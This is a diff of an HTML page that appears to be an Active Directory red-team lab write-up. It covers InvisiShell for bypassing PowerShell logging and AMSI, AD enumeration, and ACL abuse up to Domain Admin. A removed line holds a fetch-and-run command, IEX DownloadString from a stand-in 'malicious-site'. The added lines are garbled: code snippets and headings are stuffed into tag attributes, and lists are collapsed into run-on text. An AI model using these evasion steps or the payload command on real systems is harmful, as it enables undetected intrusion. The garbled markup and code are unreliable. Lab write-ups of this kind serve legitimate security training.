@@ -133,6 +133,23 @@
     .goad-sidebar-list a:hover {
       color: var(--orange-yellow-crayola);
     }
+    .goad-content table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 25px 0;
+      font-size: 18px;
+    }
+    .goad-content th, .goad-content td {
+      border: 1px solid var(--jet);
+      padding: 12px;
+      text-align: left;
+      color: var(--light-gray);
+    }
+    .goad-content th {
+      background: var(--eerie-black-2);
+      color: var(--white-2);
+      font-weight: 500;
+    }
     .back-link {
       display: flex;
       align-items: center;
@@ -298,13 +315,8 @@
 <ul>
 <li><strong>What is it?</strong></li>
 </ul>
-<p>A graph-based tool that identifies relationships and potential attack paths in AD using data collected from tools like <code>SharpHound</code>.</p>
+<p>A graph-based tool that identifies relationships and potential attack paths in AD using data collected from tools like <code>SharpHound</code>. - <strong>Advantages</strong>: - Provides a clear visual representation of privilege escalation paths. - Excellent for identifying high-value targets and misconfigurations. - <strong>Limitations</strong>: - Data collection via<code>SharpHound</code> is noisy and often flagged by MDE/MDI.</p>
 <ul>
-<li><strong>Advantages</strong>:</li>
-<li>Provides a clear visual representation of privilege escalation paths.</li>
-<li>Excellent for identifying high-value targets and misconfigurations.</li>
-<li><strong>Limitations</strong>:</li>
-<li>Data collection via <code>SharpHound</code> is noisy and often flagged by MDE/MDI.</li>
 <li>Not ideal during the initial stealthy enumeration phase.</li>
 <li><strong>When to Use It?</strong></li>
 </ul>
@@ -384,25 +396,9 @@
 <li><strong>System-wide transcription</strong> logs all PowerShell commands and their output.</li>
 <li><strong>Script block logging</strong> records the content of PowerShell scripts.</li>
 <li><strong>AMSI</strong> scans scripts for malicious content before they are executed.</li>
-<li><strong>Hooking .NET Assemblies</strong>: InvisiShell achieves its bypass by hooking into the .NET assemblies <code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>.</li>
-<li>This is accomplished using a <strong>CLR (Common Language Runtime) profiler API</strong>.</li>
-<li>A <strong>CLR profiler</strong> is a DLL loaded by the CLR at runtime to intercept and modify the behavior of these assemblies via the profiling API.</li>
-<li><strong>Methods of Use</strong>: InvisiShell can be launched in two ways, depending on the user's privileges:</li>
-<li><strong>With administrator privileges</strong>: The <code>RunWithPathAsAdmin.bat</code> script is used.</li>
-<li><strong>Without administrator privileges</strong>: The <code>RunWithRegistryNonAdmin.bat</code> script is used. This method creates a CLR profiler and starts a new PowerShell session with disabled logging.</li>
-<li><strong>Incapacitating Security Features</strong>: By hooking into these .NET assemblies, <strong>InvisiShell disables system-wide transcription, AMSI, and script block logging</strong> for the current PowerShell session.</li>
-<li><strong>Avoiding Detection</strong>: When using InvisiShell, the tool hooks to <code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>, which allows it to avoid system-wide transcription, script block logging, and AMSI.</li>
-<li><strong>Integration with Other Tools</strong>: The sources show that InvisiShell can be used in conjunction with other tools, such as PowerUp, PowerView, the AD module, and other PowerShell scripts.</li>
-<li><strong>Clean-up Process</strong>: To complete the clean-up, users must type <code>exit</code> in the new PowerShell session created by InvisiShell.</li>
-<li><strong>Modified Version</strong>: The class uses a slightly modified version of InvisiShell.</li>
-<li><strong>Location of Tools</strong>: All the tools, including InvisiShell, used in the lab environment are located in the <code>C:\AD</code> directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded.</li>
-<li><strong>InvisiShell and Binaries</strong>: It is noted that binaries like <code>Rubeus.exe</code> may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt.</li>
-<li><strong>Example Usage</strong>: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine.</li>
+<li><strong>Hooking .NET Assemblies</strong>: InvisiShell achieves its bypass by hooking into the .NET assemblies <code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>. - This is accomplished using a <strong>CLR (Common Language Runtime) profiler API</strong>. - A <strong>CLR profiler</strong> is a DLL loaded by the CLR at runtime to intercept and modify the behavior of these assemblies via the profiling API. - <strong>Methods of Use</strong>: InvisiShell can be launched in two ways, depending on the user's privileges: - <strong>With administrator privileges</strong>: The<code>RunWithPathAsAdmin.bat</code>script is used. - <strong>Without administrator privileges</strong>: The<code>RunWithRegistryNonAdmin.bat</code>script is used. This method creates a CLR profiler and starts a new PowerShell session with disabled logging. - <strong>Incapacitating Security Features</strong>: By hooking into these .NET assemblies, <strong>InvisiShell disables system-wide transcription, AMSI, and script block logging</strong> for the current PowerShell session. - <strong>Avoiding Detection</strong>: When using InvisiShell, the tool hooks to<code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>, which allows it to avoid system-wide transcription, script block logging, and AMSI. - <strong>Integration with Other Tools</strong>: The sources show that InvisiShell can be used in conjunction with other tools, such as PowerUp, PowerView, the AD module, and other PowerShell scripts. - <strong>Clean-up Process</strong>: To complete the clean-up, users must type<code>exit</code>in the new PowerShell session created by InvisiShell. - <strong>Modified Version</strong>: The class uses a slightly modified version of InvisiShell. - <strong>Location of Tools</strong>: All the tools, including InvisiShell, used in the lab environment are located in the<code>C:\AD</code>directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded. - <strong>InvisiShell and Binaries</strong>: It is noted that binaries like<code>Rubeus.exe</code>may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt. - <strong>Example Usage</strong>: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine. In summary, <strong>InvisiShell is essential for maintaining stealth in the lab environment</strong> by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software. It’s always good that we do run Invisi-Shell via cmd before we start doing our enumeration and right after script execution, Powershell will be executed. This script should be executed depending on the type of privilege we do have on the machine. If we are just a simple low level privileged user, then we should run<em> </em><code>RunWithRegistetyNonAdmin.ba</code><code>t</code><code>.</code></li>
 </ul>
 </ul>
-<p>In summary, <strong>InvisiShell is essential for maintaining stealth in the lab environment</strong> by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software.</p>
-<p>It’s always good that we do run Invisi-Shell via cmd before we start doing our enumeration and right after script execution, Powershell will be executed. This script should be executed depending on the type of privilege we do have on the machine.</p>
-<p>If we are just a simple low level privileged user, then we should run<em> </em><code>RunWithRegistetyNonAdmin.ba</code><code>t</code><code>.</code></p>
 <p>If we are a high level privileged user like Administrator for example, then we should run <code>RunWithPathAsAdmin.bat</code><code>.</code></p>
 <p><code>RunWithRegistryNonAdmin.bat</code></p>
 <img src="./images/screenshot_3.png" alt="image">
@@ -416,70 +412,51 @@
 <li>Execute a simple or obfuscated PowerShell command or script, such as:</li>
 </ul>
 </ol>
-<pre><code class="language-powershell">[System.Net.Dns]::GetHostAddresses("example.com")</code></pre>
-<ul>
-<li>Check the <strong>Windows Event Log</strong> under:</li>
-</ul>
-</ul>
-<pre><code class="language-plain-text">Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational</code></pre>
+<pre><code class="language-powershell-[system.net.dns]::gethostaddresses("example.com")```">
+  - Check the **Windows Event Log** under:</code></pre>
 <ul>
 <li>If <strong>InvisiShell</strong> is working, no entries related to your script should appear in the event logs, even if Script Block Logging is enabled.</li>
 <li><strong>Transcription Test</strong>:</li>
 <li>Look for transcription logs in the configured directory (defined by Group Policy or registry settings). By default, these logs might be stored in:</li>
 </ul>
 </ul>
-<pre><code class="language-plain-text">%USERPROFILE%\Documents\PowerShell_transcript</code></pre>
-<ul>
-<li>If <strong>InvisiShell</strong> is bypassing transcription, there should be no logs created for your session.</li>
-</ul>
-</ul>
-<h3><strong>2. Validate AMSI Bypass</strong></h3>
-<p>AMSI scans the script content in memory before execution. You can confirm whether AMSI is disabled or bypassed.</p>
-<h3><strong>Steps:</strong></h3>
-<ol>
-<li>Run a script known to trigger AMSI, such as one containing flagged keywords:</li>
-</ol>
-<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')</code></pre>
+<pre><code class="language-plain-text-%userprofile%\documents\powershell_transcript```">
+  - If **InvisiShell** is bypassing transcription, there should be no logs created for your session.
+### **2. Validate AMSI Bypass**
+
+AMSI scans the script content in memory before execution. You can confirm whether AMSI is disabled or bypassed.
+### **Steps:**
+
+1. Run a script known to trigger AMSI, such as one containing flagged keywords:</code></pre>
 <ol>
 <li>Without InvisiShell, this should trigger an AMSI detection and display a warning like:</li>
 </ol>
-<pre><code class="language-plain-text">This script contains malicious content and has been blocked by your antivirus software.</code></pre>
-<ol>
-<li>If <strong>InvisiShell</strong> is active and bypassing AMSI, the script should execute without any warning or blocking.</li>
-</ol>
-<h3><strong>3. Validate Constrained Language Mode (CLM)</strong></h3>
-<p>If CLM is enforced, it restricts advanced features like custom .NET assemblies and cmdlets.</p>
-<h3><strong>Steps:</strong></h3>
-<ol>
-<li>Check if CLM is enforced by running:</li>
-</ol>
-<pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode</code></pre>
+<pre><code class="language-plain-text-this-script-contains-malicious-content-and-has-been-blocked-by-your-antivirus-software.```">
+1. If **InvisiShell** is active and bypassing AMSI, the script should execute without any warning or blocking.
+### **3. Validate Constrained Language Mode (CLM)**
+
+If CLM is enforced, it restricts advanced features like custom .NET assemblies and cmdlets.
+### **Steps:**
+
+1. Check if CLM is enforced by running:</code></pre>
 <ul>
 <li><strong>FullLanguage</strong>: No CLM restrictions.</li>
 <li><strong>ConstrainedLanguage</strong>: CLM is enforced.</li>
 <li>Try to execute a command that requires full language mode, such as:</li>
 </ul>
 </ul>
-<pre><code class="language-powershell">Add-Type -TypeDefinition 'public class Test { public string Hello() { return "Hello"; } }'</code></pre>
+<pre><code class="language-powershell-add-type--typedefinition-'public-class-test-{-public-string-hello()-{-return-"hello";-}-}'```">
+  - If CLM is bypassed, the command should succeed.
+  - If not, CLM is still enforced, and you'll see an error.
+### **4. Check Registry and Configurations**
+
+InvisiShell relies on registry modifications and hooking into PowerShell processes.
+### **Steps:**
+
+1. Verify Registry Modifications:
+  - Check if the custom **COR_PROFILER** and related registry keys were added:</code></pre>
 <ul>
-<li>If CLM is bypassed, the command should succeed.</li>
-<li>If not, CLM is still enforced, and you'll see an error.</li>
-</ul>
-</ul>
-<h3><strong>4. Check Registry and Configurations</strong></h3>
-<p>InvisiShell relies on registry modifications and hooking into PowerShell processes.</p>
-<h3><strong>Steps:</strong></h3>
-<ol>
-<li>Verify Registry Modifications:</li>
-<ul>
-<li>Check if the custom <strong>COR_PROFILER</strong> and related registry keys were added:</li>
-</ul>
-</ol>
-<pre><code class="language-plain-text">HKEY_CURRENT_USER\Software\Classes\CLSID\&lt;GUID&gt;\InprocServer32</code></pre>
-<ul>
-<li>Confirm the custom profiler (e.g., <code>InShellProf.dll</code>) is loaded by inspecting the registry and the DLL path.</li>
-<li>Validate DLL Injection:</li>
-<li>Use tools like <strong>Process Explorer</strong> or <strong>Process Monitor</strong> to check if the <code>InShellProf.dll</code> file is loaded into the PowerShell process.</li>
+<li>Confirm the custom profiler (e.g., <code>InShellProf.dll</code>) is loaded by inspecting the registry and the DLL path. 1. Validate DLL Injection: - Use tools like <strong>Process Explorer</strong> or <strong>Process Monitor</strong> to check if the<code>InShellProf.dll</code> file is loaded into the PowerShell process.</li>
 </ul>
 </ul>
 <h3><strong>5. Test Logging with a Known Detection Tool</strong></h3>
@@ -561,19 +538,16 @@
 <p>As we did previously while enumerating Users and Computers, we can also filter to simply get a full list of all the users by filtering by the property <code>name</code>.</p>
 <p><code>Get-ADGroup -Filter * | Select -Expand name</code></p>
 <img src="./images/screenshot_10.png" alt="image">
-<p>Now we do have a full list of all the groups inside <code>us.techcorp.local</code>.</p>
-<p>Now let’s move a bit further on this enumeration… Let’s imagine that we want to  go over one of the groups we just found inside the target domain and check the attributes of one specific group of our interest. For example, we can enumerate  <code>Domain Admins</code> Group by simply checking the group itself then we check its properties.</p>
+<p>Now we do have a full list of all the groups inside <code>us.techcorp.local</code>. Now let’s move a bit further on this enumeration… Let’s imagine that we want to go over one of the groups we just found inside the target domain and check the attributes of one specific group of our interest. For example, we can enumerate<code>Domain Admins</code> Group by simply checking the group itself then we check its properties.</p>
 <p><code>Get-ADGroup -Identity 'Domain Admins'</code></p>
 <img src="./images/screenshot_11.png" alt="image">
 <p><code>Get-ADGroup -Identity 'Domain Admins' -Properties *</code></p>
 <img src="./images/screenshot_12.png" alt="image">
 <p>It is possible to see above that by checking the ‘Domain Admins’ group properties, it reveals lots of information, including also who is member of the ‘Domain Admins’ group.</p>
-<p>Let’s say now, we would like to know who are the member of a specific group, for example ‘<code>Domain Admins</code>’.</p>
-<p>We can use the command <code>Get-ADGroupMember</code> to achieve this task.</p>
+<p>Let’s say now, we would like to know who are the member of a specific group, for example ‘<code>Domain Admins</code>’. We can use the command<code>Get-ADGroupMember</code> to achieve this task.</p>
 <p><code>Get-ADGroupMember -Identity 'Domain Admins'</code></p>
 <img src="./images/screenshot_13.png" alt="image">
-<p>The output from our previous enumeration, confirms what we saw when we used the Get-ADGroup command to enumerate the ‘<code>Domain Admins</code>’ properties.</p>
-<p>Inside Domain Admins group we do have 2 users which are <code>Administrator</code> and <code>decda</code>.</p>
+<p>The output from our previous enumeration, confirms what we saw when we used the Get-ADGroup command to enumerate the ‘<code>Domain Admins</code>’ properties. Inside Domain Admins group we do have 2 users which are<code>Administrator</code> and <code>decda</code>.</p>
 <h3>Special Group</h3>
 <p>There is a special case here for a special group. If you remember from our Groups enumeration, there is a Group named ‘<code>Enterprise Admins'</code></p>
 <p>The <strong>Enterprise Admins group</strong> is a highly privileged security group in a Microsoft Active Directory (AD) forest. It exists only in the <strong>root domain</strong> of the AD forest and grants its members administrative privileges across the entire forest, including all child domains. Members of this group have the ability to manage any domain, Domain Controllers (DCs), and critical AD components across the forest.</p>
@@ -599,15 +573,12 @@
 </ul>
 <p><code>Get-ADGroupMember -Identity 'Enterprise Admins'</code></p>
 <img src="./images/screenshot_14.png" alt="image">
-<p>The initial query failed because the <strong>Enterprise Admins group</strong> does not exist in the child domain (<code>us.techcorp.local</code>) being queried.</p>
-<p>By specifying the <code>-Server</code> parameter and pointing it to the <strong>root domain</strong> (<code>techcorp.local</code>), the command will direct the query to the correct location where the <strong>Enterprise Admins group</strong> resides, allowing the enumeration to succeed.</p>
-<p><code>Get-ADGroupMember -Identity 'Enterprise Admins' -Server 'techcorp.local'</code></p>
+<p>The initial query failed because the <strong>Enterprise Admins group</strong> does not exist in the child domain (<code>us.techcorp.local</code>) being queried. By specifying the<code>-Server</code> parameter and pointing it to the <strong>root domain</strong> (<code>techcorp.local</code>), the command will direct the query to the correct location where the <strong>Enterprise Admins group</strong> resides, allowing the enumeration to succeed.<code>Get-ADGroupMember -Identity 'Enterprise Admins' -Server 'techcorp.local'</code></p>
 <img src="./images/screenshot_15.png" alt="image">
 <h3><strong>Why Did the Query Work with </strong><code>Server</code><strong> and the Root Domain?</strong></h3>
 <ul>
 <li><strong>Specifying the Root Domain</strong>:</li>
-<li>By adding the <code>Server</code> parameter and pointing it to the <strong>root domain controller</strong> (<code>techcorp.local</code>), the query is explicitly directed to the correct domain where the <strong>Enterprise Admins group</strong> resides.</li>
-<li>The <strong>Enterprise Admins group</strong> is located in the <strong>root domain</strong> of the forest (<code>techcorp.local</code>) because it is a forest-wide administrative group and does not exist in any child domains.</li>
+<li>By adding the <code>Server</code> parameter and pointing it to the <strong>root domain controller</strong> (<code>techcorp.local</code>), the query is explicitly directed to the correct domain where the <strong>Enterprise Admins group</strong> resides. - The <strong>Enterprise Admins group</strong> is located in the <strong>root domain</strong> of the forest (<code>techcorp.local</code>) because it is a forest-wide administrative group and does not exist in any child domains.</li>
 <li><strong>Active Directory Hierarchy</strong>:</li>
 <li>Active Directory is designed as a hierarchical system with the root domain serving as the topmost level in the forest.</li>
 <li>Forest-wide objects, like the <strong>Enterprise Admins group</strong>, are only created and stored in the <strong>root domain</strong>’s directory partition.</li>
@@ -713,16 +684,10 @@
 <p>If a GPO with a Restricted Group policy is configured to:</p>
 <ul>
 <li><strong>Group Name</strong>: Local Administrators.</li>
-<li><strong>Members</strong>: <code>Domain Admins, ITSupport</code>.</li>
+<li><strong>Members</strong>: <code>Domain Admins, ITSupport</code>. Then, the <strong>Administrators group</strong> on all targeted systems will only contain<code>Domain Admins</code> and <code>ITSupport</code>, regardless of any manual changes made locally. Issuing the following command, we are able to gather the Restricted groups.<code>Get-DomainGPOLocalGroup</code></li>
 </ul>
-<p>Then, the <strong>Administrators group</strong> on all targeted systems will only contain <code>Domain Admins</code> and <code>ITSupport</code>, regardless of any manual changes made locally.</p>
-<p>Issuing the following command, we are able to gather the Restricted groups.</p>
-<p><code>Get-DomainGPOLocalGroup</code></p>
 <img src="./images/screenshot_18.png" alt="image">
-<p>It is possible to see that we do have one Restricted Group in the domain, named <code>machineadmins</code>.</p>
-<p>Now that we already know that we do have at least one Restricted Group.</p>
-<p>Let’s see if we can find out the members of this Restricted Group.</p>
-<p><code>Get-DomainGroupMember -Identity 'machineadmins'</code></p>
+<p>It is possible to see that we do have one Restricted Group in the domain, named <code>machineadmins</code>. Now that we already know that we do have at least one Restricted Group. Let’s see if we can find out the members of this Restricted Group.<code>Get-DomainGroupMember -Identity 'machineadmins'</code></p>
 <p>We can also try to check the Members of this Restricted Group with ADModule. But it seems like we have no members at all in this Restricted Group.</p>
 <p><code>Get-ADGroupMember -Identity 'machineadmins'</code></p>
 <h3>Organization Units Enumeration</h3>
@@ -814,12 +779,7 @@
 <li>The compromised account belongs to a low-privileged user in the domain.</li>
 <li><strong>Enumeration of ACLs</strong>:</li>
 <li>The pentester enumerates ACLs on domain objects like users, groups, and OUs.</li>
-<li>They find that the compromised user has <strong>WriteProperty</strong> permissions on a service account (e.g., <code>SQLService</code>).</li>
-<li><strong>Exploitation</strong>:</li>
-<li>The pentester abuses <strong>WriteProperty</strong> permissions to reset the password of the <code>SQLService</code> account.</li>
-<li><code>SQLService</code> is found to be a member of the <strong>Domain Admins</strong> group.</li>
-<li><strong>Privilege Escalation</strong>:</li>
-<li>With the new password, the pentester authenticates as <code>SQLService</code> and gains Domain Admin privileges.</li>
+<li>They find that the compromised user has <strong>WriteProperty</strong> permissions on a service account (e.g., <code>SQLService</code>). 1. <strong>Exploitation</strong>: - The pentester abuses <strong>WriteProperty</strong> permissions to reset the password of the<code>SQLService</code>account. -<code>SQLService</code>is found to be a member of the <strong>Domain Admins</strong> group. 1. <strong>Privilege Escalation</strong>: - With the new password, the pentester authenticates as<code>SQLService</code> and gains Domain Admin privileges.</li>
 <li><strong>Post-Exploitation</strong>:</li>
 <li>The pentester continues to enumerate additional ACLs for persistence mechanisms, such as adding shadow administrators or backdoors.</li>
 </ul>
@@ -858,12 +818,7 @@
 <p><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'StudentUsers'}</code></p>
 <img src="./images/screenshot_28.png" alt="image">
 <p>As a member of the <code>StudentsUsers</code> group we do have:</p>
-<p><strong>GenericAll on </strong><code>Support168User</code><strong> , </strong><code>Support169User</code><strong> and </strong><code>Support170User</code>:</p>
-<ul>
-<li>Full control, allowing password resets, attribute modifications, group membership changes, or deletion of these accounts. This can be used for <strong>privilege escalation</strong> if these accounts have elevated privileges.</li>
-</ul>
-<p><strong>Permissions on </strong><code>MailMgmt</code><strong> OU</strong>:</p>
-<p>These permissions offer opportunities for <strong>privilege escalation</strong> by taking control of the <code>Support</code> accounts or manipulating objects in the <code>MailMgmt</code> OU.</p>
+<p><strong>GenericAll on </strong><code>Support168User</code><strong> , </strong><code>Support169User</code><strong> and </strong><code>Support170User</code>: - Full control, allowing password resets, attribute modifications, group membership changes, or deletion of these accounts. This can be used for <strong>privilege escalation</strong> if these accounts have elevated privileges. <strong>Permissions on </strong><code>MailMgmt</code><strong> OU</strong>: These permissions offer opportunities for <strong>privilege escalation</strong> by taking control of the<code>Support</code> accounts or manipulating objects in the <code>MailMgmt</code> OU.</p>
 <p>Regular ACL reviews are critical to prevent such misconfigurations.</p>
 <h3><strong>Enumerating Domain, Forest & Trusts </strong></h3>
 <p><strong>Domain, forest, and trust enumeration</strong> is a crucial phase in Active Directory (AD) enumeration during penetration testing or Red Team engagements. This process provides insights into the structure, relationships, and potential attack paths within and across AD environments. Understanding how domains, forests, and trusts interact is essential for identifying misconfiguration and opportunities for lateral movement, privilege escalation, and even cross-domain compromises.</p>
@@ -988,30 +943,14 @@
 <p><code>Get-ADForest</code></p>
 <img src="./images/screenshot_30.png" alt="image">
 <p>This command quickly maps the forest's structure, identifies key servers (e.g., Domain Controllers, Global Catalogs), and highlights potential targets for attacks or lateral movement.</p>
-<p>The <code>Get-ADForest</code> command enumerates the structure and key components of the Active Directory <strong>forest</strong>. It provides a summary of:</p>
-<ol>
-<li><strong>Domains</strong>: Lists all domains in the forest (e.g., <code>techcorp.local</code> and <code>us.techcorp.local</code>).</li>
-<li><strong>FSMO Roles</strong>:</li>
-<ul>
-<li><strong>DomainNamingMaster</strong>: Server managing domain additions/removals.</li>
-<li><strong>SchemaMaster</strong>: Server managing schema updates.</li>
-<li><strong>Global Catalogs</strong>: Servers hosting cross-domain data for faster queries.</li>
-<li><strong>Forest Functional Level</strong>: Features available in the forest (<code>Windows2016Forest</code>).</li>
-<li><strong>Application Partitions</strong>: DNS replication zones (<code>DomainDnsZones</code> and <code>ForestDnsZones</code>).</li>
-<li><strong>Root Domain</strong>: Identifies the forest's root domain (<code>techcorp.local</code>).</li>
-<li><strong>Sites</strong>: Lists AD sites (<code>Default-First-Site-Name</code>).</li>
-</ul>
-</ol>
-<p>If we just want to bring a list of all domains inside this forest, we can simply use the same query, but this time we can filter by <code>Domains</code> property.</p>
-<p><code>(Get-ADForest).Domains</code></p>
+<p>The <code>Get-ADForest</code>command enumerates the structure and key components of the Active Directory <strong>forest</strong>. It provides a summary of: 1. <strong>Domains</strong>: Lists all domains in the forest (e.g.,<code>techcorp.local</code> and <code>us.techcorp.local</code>). 1. <strong>FSMO Roles</strong>: - <strong>DomainNamingMaster</strong>: Server managing domain additions/removals. - <strong>SchemaMaster</strong>: Server managing schema updates. 1. <strong>Global Catalogs</strong>: Servers hosting cross-domain data for faster queries. 1. <strong>Forest Functional Level</strong>: Features available in the forest (<code>Windows2016Forest</code>). 1. <strong>Application Partitions</strong>: DNS replication zones (<code>DomainDnsZones</code> and <code>ForestDnsZones</code>). 1. <strong>Root Domain</strong>: Identifies the forest's root domain (<code>techcorp.local</code>). 1. <strong>Sites</strong>: Lists AD sites (<code>Default-First-Site-Name</code>). If we just want to bring a list of all domains inside this forest, we can simply use the same query, but this time we can filter by<code>Domains</code>property.<code>(Get-ADForest).Domains</code></p>
 <img src="./images/screenshot_31.png" alt="image">
 <p>Above we can see all the domains belonging to this forest.</p>
 <h3>Enumerating Domains with PowerView</h3>
 <p>PowerView enumeration will bring the output a bit different from ADModule even tho we are basically carrying the same information.</p>
 <p><code>Get-ForestDomain -Verbose</code></p>
 <img src="./images/screenshot_32.png" alt="image">
-<p>The output from PowerView will tell us in simple words what is the Forest name we are currently, which is this case the current forest is <code>techcorp.local</code>.</p>
-<p>We can also see that we only have one Childen Domain (<code>us.techcorp.local</code>).</p>
+<p>The output from PowerView will tell us in simple words what is the Forest name we are currently, which is this case the current forest is <code>techcorp.local</code>. We can also see that we only have one Childen Domain (<code>us.techcorp.local</code>).</p>
 <p>Keep in mind that the command below will only show us domains within forest, no external domains will be shown here.</p>
 <p>We can simply query all domains from this forest by filtering by <code>name</code> property.</p>
 <p><code>Get-ForestDomain -Verbose | Select -ExpandProperty Name</code></p>
@@ -1023,91 +962,20 @@
 <p>The above query will show us that we do have 2 Trusts which both of them are BiDirectional Trusts. To be able to determine which type of Trusts we do have, we should pay attention on the following properties on the previous query.</p>
 <ul>
 <li><strong>(techcorp.local) Internal Trust</strong></li>
-<li><strong>Name</strong>: <code>techcorp.local</code> → Same domain root as <code>Source</code>.</li>
-<li><strong>IntraForest</strong>: <code>True</code> → Internal trust.</li>
-<li><strong>ForestTransitive</strong>: <code>False</code> → Restricted within the forest (likely parent-child relationship).</li>
-<li><strong>Direction</strong>: BiDirectional</li>
-<li><strong>TrustType</strong>: <code>UPLEVEL (0x00000002)</code> - A trusted Windows domain that is running Active Directory.</li>
-<li><strong>(eu.local) External Trust</strong></li>
+<li><strong>Name</strong>: <code>techcorp.local</code> → Same domain root as <code>Source</code>. - <strong>IntraForest</strong>:<code>True</code>→ Internal trust. - <strong>ForestTransitive</strong>:<code>False</code>→ Restricted within the forest (likely parent-child relationship). - <strong>Direction</strong>: BiDirectional - <strong>TrustType</strong>:<code>UPLEVEL (0x00000002)</code>- A trusted Windows domain that is running Active Directory. - <strong>(eu.local) External Trust</strong> TrustType: - <strong>Name</strong>:<code>eu.local</code> → Different domain from <code>Source</code>. - <strong>IntraForest</strong>:<code>False</code>→ External trust. - <strong>ForestTransitive</strong>:<code>False</code>→ Likely a specific domain-to-domain trust, not spanning multiple domains. - <strong>Direction</strong>: BiDirectional - <strong>TrustType</strong>:<code>UPLEVEL (0x00000002)</code>- A trusted Windows domain that is running Active Directory. - <strong>DOWNLEVEL</strong> (0x00000001) — A trusted Windows domain that IS NOT running Active Directory. This is output as <strong>WINDOWS<em>NON</em>ACTIVE<em>DIRECTORY</strong> in PowerView for those not as familiar with the terminology. - <strong>UPLEVEL</strong> (0x00000002) — A trusted Windows domain that is running Active Directory.This is output as <strong>WINDOWS</em>ACTIVE<em>DIRECTORY</strong> in PowerView for those not as familiar with the terminology. - <strong>MIT</strong> (0x00000003) — a trusted domain that is running a non-Windows (<em>nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120. TrustAttributes: - <strong>NON</em>TRANSITIVE</strong> (0x00000001) — The trust cannot be used transitively. That is, if DomainA trusts DomainB and DomainB trusts DomainC, then DomainA does not automatically trust DomainC. Also, if a trust is non-transitive, thenyou will not be able to query any Active Directory information from trusts up the chain from the non-transitive point. External trusts are implicitly non-transitive. - <strong>UPLEVEL<em>ONLY</strong> (0x00000002) — only Windows 2000 operating system and newer clients can use the trust. - <strong>QUARANTINED</em>DOMAIN </strong>(0x00000004) — SID filtering is enabled (more on this later). Output as <strong>FILTER<em>SIDS</strong> with PowerView for simplicity. - <strong>FOREST</em>TRANSITIVE</strong> (0x00000008) — cross-forest trust between the root of two domain forests running at least domain functional level 2003 or above. - <strong>CROSS<em>ORGANIZATION</strong> (0x00000010) — the trust is to a domain or forest that is not part of the organization, which adds the OTHER</em>ORGANIZATION SID. This is a bit of a weird one. According to this post it means that the selective authentication security protection is enabled. For more information, check out this MSDN doc. - <strong>WITHIN<em>FOREST</strong> (0x00000020) — the trusted domain is within the same forest, meaning a parent->child or cross-link relationship - <strong>TREAT</em>AS<em>EXTERNAL </strong>(0x00000040) — the trust is to be treated as external for trust boundary purposes. According to the documentation, “</em>If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering. <em><strong>Cross-forest trusts are more stringently filtered than external trusts</strong></em>. This attribute relaxes those cross-forest trusts to be equivalent to external trusts.<em>” This sounds enticing, and I’m not 100% sure on the security implications of this statement ¯\</em>(ツ)<em>/¯ but I will update this post if anything new surfaces. - <strong>USES</em>RC4<em>ENCRYPTION </strong>(0x00000080) — if the TrustType is MIT, specifies that the trust that supports RC4 keys. - <strong>USES</em>AES<em>KEYS</strong> (0x00000100) — not listed in the linked Microsoft documentation, but according to some documentation I’ve been able to find online, it specifies that AES keys are used to encrypt KRB TGTs. - <strong>CROSS</em>ORGANIZATION<em>NO</em>TGT<em>DELEGATION</strong> (0x00000200) — “</em>If this bit is set, tickets granted under this trust MUST NOT be trusted for delegation.<em>” This is described more in [MS-KILE] 3.3.5.7.5 (Cross-Domain Trust and Referrals.) - <strong>PIM</em>TRUST</strong> (0x00000400) — “</em>If this bit and the TATE (treat as external) bit are set, then a cross-forest trust to a domain is to be treated as Privileged Identity Management trust for the purposes of SID Filtering.<em>” According to [MS-PAC] 4.1.2.2 (SID Filtering and Claims Transformation), “</em>A domain can be externally managed by a domain that is outside the forest. The trusting domain allows SIDs that are local to its forest to come over a PrivilegedIdentityManagement trust.<em>” Since we do have a 2-Ways or BiDirectional trust with an External Trust<code>eu.local</code>, we can also query the Trusts <code>eu.local</code>have.<code>Get-ADTrust -Filter </em> -Server eu.local</code></li>
 </ul>
 </ul>
-<p>TrustType:</p>
-<ul>
-<li><strong>Name</strong>: <code>eu.local</code> → Different domain from <code>Source</code>.</li>
-<li><strong>IntraForest</strong>: <code>False</code> → External trust.</li>
-<li><strong>ForestTransitive</strong>: <code>False</code> → Likely a specific domain-to-domain trust, not spanning multiple domains.</li>
-<li><strong>Direction</strong>: BiDirectional</li>
-<li><strong>TrustType</strong>: <code>UPLEVEL (0x00000002)</code> - A trusted Windows domain that is running Active Directory.</li>
-<li><strong>DOWNLEVEL</strong> (0x00000001) — A trusted Windows domain that IS NOT running Active Directory. This is output as <strong>WINDOWS<em>NON</em>ACTIVE_DIRECTORY</strong> in PowerView for those not as familiar with the terminology.</li>
-<li><strong>UPLEVEL</strong> (0x00000002) — A trusted Windows domain that is running Active Directory.This is output as <strong>WINDOWS<em>ACTIVE</em>DIRECTORY</strong> in PowerView for those not as familiar with the terminology.</li>
-<li><strong>MIT</strong> (0x00000003) — a trusted domain that is running a non-Windows (*nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120.</li>
-</ul>
-</ul>
-<p>TrustAttributes:</p>
